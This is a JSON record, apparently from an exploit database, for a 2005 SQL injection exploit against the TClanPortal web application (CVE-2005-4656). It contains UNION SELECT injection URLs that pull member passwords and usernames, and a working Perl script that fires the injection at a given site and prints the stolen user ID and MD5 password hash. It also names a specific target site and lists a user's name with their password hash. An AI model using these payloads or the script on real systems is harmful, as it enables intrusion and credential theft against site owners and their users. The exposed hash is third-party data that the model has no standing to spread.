{
  "id": "1273",
  "title": "TClanPortal 1.1.3 - &#039;id&#039; SQL Injection",
  "cve": "CVE-2005-4656",
  "vuln_type": "sqli",
  "code": "# TClanPortal Version 3 ..\r\n# Search By Google :-\r\n# by TriggerTG.de 2003 - Version 3\r\n#\r\n# Gr33tz :-\r\n#         Abducter .. SQL Injection's FOunder   - | abducter_minds76@hotmail.com |-\r\n#         Devil-00 .. SQL Injection's Exploting - | devil-00@s4a.cc | -\r\n#         Security4Arab .. A'Where Home .. WE LOVE S4A FOR EVER :P\r\n#         HACKERS PAL ..\r\n#         Yes2Hack ..\r\n#         WwW.Sqor.NeT\r\n#         WwW.S4a.Cc\r\n#         WwW.SecurityGurus.NeT\r\n#\r\n#\r\n#\r\n# This Injection's Whene Prefix = \"\";\r\n#\r\n# 1- SQL Injection\r\n# /ClanPortal/linkdl/index.php?action=relatedlink&id=-1%20UNION%20SELECT%20pw,name,null,name,name,name%20FROM%20member%20%20WHERE%20id=1/*\r\n# http://yahzee.ya.funpic.de/ClanPortal/\r\n#\r\n# Richard\r\n# d38b89019f0496a4e67bfbe95cbcba0f    - MD5\r\n#\r\n# 2- SQL Injection\r\n# /linkdl/index.php?action=bewerten&id=-1%20UNION%20SELECT%20pw,null,null%20FROM%20member%20%20WHERE%20id=1/*\r\n# [!] GET Password\r\n#\r\n#\r\n# /linkdl/index.php?action=bewerten&id=-1%20UNION%20SELECT%20name,null,null%20FROM%20member%20%20WHERE%20id=1/*\r\n# [!] GET Username\r\n#\r\n# [!] Perl Code By Devil-00 | devil-00@s4a.cc |\r\n#------------------------------------------------------------------------------------------------------------\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"\\n\\n==========================================\\n\";\r\nprint \"\\n= Exploit for TClanPortal Version 3            \";\r\nprint \"\\n= Coded By Devil-00 | devil-00@s4a.cc |        \";\r\nprint \"\\n= Gr33tz :-                                                            \";\r\nprint \"\\n= Abducter .. SQL Injection's FOunder   - | abducter_minds76@hotmail.com |-            \";\r\nprint \"\\n= Devil-00 .. SQL Injection's Exploting - | devil-00@s4a.cc | -        \";\r\nprint \"\\n= Security4Arab .. A'Where Home .. WE LOVE S4A FOR EVER :P             \";\r\nprint \"\\n= HACKERS PAL ..                                                       \";\r\nprint \"\\n= Yes2Hack ..                                                          \";\r\nprint \"\\n= WwW.Sqor.NeT                                                         \";\r\nprint \"\\n= WwW.S4a.Cc                                                           \";\r\nprint \"\\n= WwW.SecurityGurus.NeT                                        \";\r\nprint \"\\n============================================\\n\\n\";\r\n\r\nif(!$ARGV[0] or !$ARGV[1]) {\r\n  print \"Usage:\\nperl $0 [Full-Path] [SQL Prefix] [User ID]\\n\\nExample:\\nperl $0 http://yahzee.ya.funpic.de/ClanPortal/ 1\\n\";\r\n  exit(0);\r\n}\r\n$url = \"/linkdl/index.php?action=relatedlink&id=-1%20UNION%20SELECT%20pw,name,null,name,name,name%20FROM%20member%20%20WHERE%20id=$ARGV[1]/*\";\r\n$page = get($ARGV[0].$url) || die \"[-] Unable to retrieve: $!\";\r\nprint \"[+] Connected to: $ARGV[0]\\n\";\r\n$page =~ m/<a href='(.*?)' target='_parent'>/ && print \"[+] User ID is: $1\\n\";\r\nprint \"[-] Unable to retrieve User ID\\n\" if(!$1);\r\n$page =~ m/<b>Name:<\\/b> <a href='index\\.php\\?action=kat&id=0'>(.*?)<\\/a>/ && print \"[+] MD5 hash of password is: $1\\n\";\r\nprint \"[-] Unable to retrieve hash of password\\n\" if(!$1);\r\n\r\n# milw0rm.com [2005-10-26]",
  "url": "https://www.exploit-db.com/exploits/1273"
}